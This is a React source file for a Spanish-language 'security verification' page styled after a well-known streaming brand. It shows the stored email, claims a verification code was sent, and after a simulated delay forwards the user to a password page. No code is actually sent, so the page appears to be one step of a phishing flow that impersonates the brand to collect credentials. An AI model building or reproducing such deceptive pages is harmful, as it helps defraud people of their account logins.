/**
 * Security Confirmation Page
 * Shows after user submits email/phone
 */

import PageTransition from "@/components/PageTransition";
import { CheckCircle2, Shield } from "lucide-react";
import { useState, useEffect } from "react";
import { useLocation } from "wouter";
import BrandLogo from "@/components/BrandLogo";

export default function SecurityConfirmation() {
  const [, setLocation] = useLocation();
  const [email, setEmail] = useState("");
  const [isLoading, setIsLoading] = useState(false);

  useEffect(() => {
    // Get email from session storage
    const storedEmail = sessionStorage.getItem("userEmail");
    if (storedEmail) {
      setEmail(storedEmail);
    }
  }, []);

  const handleContinue = async () => {
    setIsLoading(true);
    // Simulate security verification
    setTimeout(() => {
      setIsLoading(false);
      setLocation("/password");
    }, 1500);
  };

  return (
    <PageTransition>
      <div className="min-h-[100dvh] w-full bg-black flex flex-col">
        {/* Header */}
        <header className="w-full px-4 sm:px-8 lg:px-12 pt-4 pb-2 border-b border-[#333]">
          <BrandLogo height={20} />
        </header>

        {/* Main Content */}
        <main className="flex-1 flex flex-col items-center justify-center px-4 sm:px-8 lg:px-12">
          <div className="w-full max-w-[450px] text-center">
            {/* Security Icon */}
            <div className="flex justify-center mb-8">
              <div className="relative">
                <div className="absolute inset-0 bg-[#E50914] rounded-full blur-xl opacity-20 animate-pulse"></div>
                <Shield className="w-16 h-16 text-[#E50914] relative" />
              </div>
            </div>

            {/* Title */}
            <h1 className="text-[28px] sm:text-[32px] lg:text-[36px] font-bold text-white mb-3 leading-[1.15]">
              Verificación de Seguridad
            </h1>

            {/* Subtitle */}
            <p className="text-[#8c8c8c] text-[15px] sm:text-[16px] mb-8">
              Hemos enviado un código de verificación a:
            </p>

            {/* Email Display */}
            <div className="bg-[#1a1a1a] border border-[#333] rounded-lg p-4 mb-8">
              <p className="text-white text-[15px] sm:text-[16px] font-medium break-all">
                {email || "tu email"}
              </p>
            </div>

            {/* Verification Steps */}
            <div className="space-y-4 mb-8 text-left">
              <div className="flex gap-3 items-start">
                <CheckCircle2 className="w-5 h-5 text-[#E50914] flex-shrink-0 mt-0.5" />
                <div>
                  <p className="text-white text-[14px] sm:text-[15px] font-medium">
                    Código enviado
                  </p>
                  <p className="text-[#8c8c8c] text-[13px] sm:text-[14px]">
                    Revisa tu email o SMS
                  </p>
                </div>
              </div>
              <div className="flex gap-3 items-start">
                <CheckCircle2 className="w-5 h-5 text-[#E50914] flex-shrink-0 mt-0.5" />
                <div>
                  <p className="text-white text-[14px] sm:text-[15px] font-medium">
                    Ingresa el código
                  </p>
                  <p className="text-[#8c8c8c] text-[13px] sm:text-[14px]">
                    En la siguiente pantalla
                  </p>
                </div>
              </div>
              <div className="flex gap-3 items-start">
                <CheckCircle2 className="w-5 h-5 text-[#E50914] flex-shrink-0 mt-0.5" />
                <div>
                  <p className="text-white text-[14px] sm:text-[15px] font-medium">
                    Acceso seguro
                  </p>
                  <p className="text-[#8c8c8c] text-[13px] sm:text-[14px]">
                    Tu cuenta estará protegida
                  </p>
                </div>
              </div>
            </div>

            {/* Continue Button */}
            <button
              onClick={handleContinue}
              disabled={isLoading}
              className="w-full h-[48px] sm:h-[50px] bg-[#E50914] text-white text-[15px] sm:text-[16px] font-bold rounded hover:bg-[#F6121D] active:scale-[0.98] transition-all duration-150 disabled:opacity-70 flex items-center justify-center gap-2"
            >
              {isLoading ? (
                <>
                  <div className="w-4 h-4 border-2 border-white border-t-transparent rounded-full animate-spin"></div>
                  <span>Continuando...</span>
                </>
              ) : (
                "Continuar"
              )}
            </button>

            {/* Help Text */}
            <p className="text-[#8c8c8c] text-[12px] sm:text-[13px] mt-6">
              ¿No recibiste el código? Revisa tu carpeta de spam o{" "}
              <button className="text-[#E50914] hover:underline">
                solicita uno nuevo
              </button>
            </p>
          </div>
        </main>
      </div>
    </PageTransition>
  );
}
